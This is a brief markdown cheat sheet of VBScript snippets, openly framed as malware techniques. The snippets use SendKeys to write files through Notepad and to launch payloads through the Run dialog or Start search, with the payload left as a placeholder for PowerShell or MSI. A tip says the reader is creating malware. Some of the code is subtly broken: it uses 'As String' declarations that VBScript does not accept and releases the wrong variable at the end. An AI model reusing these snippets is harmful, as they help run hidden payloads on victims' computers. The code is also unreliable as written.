# VBScript

## File Transfer via Text Editor

> [!TIP] Enumerate Text Editors
> Do not feel restricted since it's a malware you're trying to create. You can enumerate any text editors that is installed in the system. It doesn't have only exclusive to `notepad.exe` user.

```vb
Dim Object_Shell
Set Object_Shell = CreateObject("WScript.Shell")

Dim text_editor, contents, filepath

text_editor = "notepad.exe"
contents = "This is a String"
filepath = "C:\\path\\to\\file.txt" 

' Open text editor
Object_Shell.Run text_editor
WScript.Sleep 3000

' Write the contents in the text editor
Object_Shell.SendKeys contents
WScript.Sleep 2000

' Open the Save dialog (Ctrl + S)
Object_Shell.SendKeys "^s"
WScript.Sleep 2000

' Save path of the file then return
Object_Shell.SendKeys filepath
WScript.Sleep 2000
Object_Shell.SendKeys "{ENTER}"

Set Object_Shell = Nothing
```

## Dialogue Box

```vb
Dim Object_Shell
Set Object_Shell = CreateObject("WScript.Shell")
Dim commands As String

' Add payload here. Such as, PowerShell, MSI, etc
commands = ""

' Open the Start Menu (Ctrl + Esc)
Object_Shell.SendKeys "^{ESC}"
WScript.Sleep 1000

' Open Dialogue Box (Win + R)
Object_Shell.SendKeys "r"
WScript.Sleep 1000

Object_Shell.SendKeys commands

Set WshShell = Nothing
```

## Search Bar

```vb
Dim Object_Shell
Set Object_Shell = CreateObject("WScript.Shell")
Dim commands As String

' Append @ as a prefix in order to execute commands.
' Add payload here. Such as, PowerShell, MSI, etc
commands = "@"

' Open the Start Menu (Ctrl + Esc)
Object_Shell.SendKeys "^{ESC}"
WScript.Sleep 1000

Object_Shell.SendKeys commands

Set WshShell = Nothing
```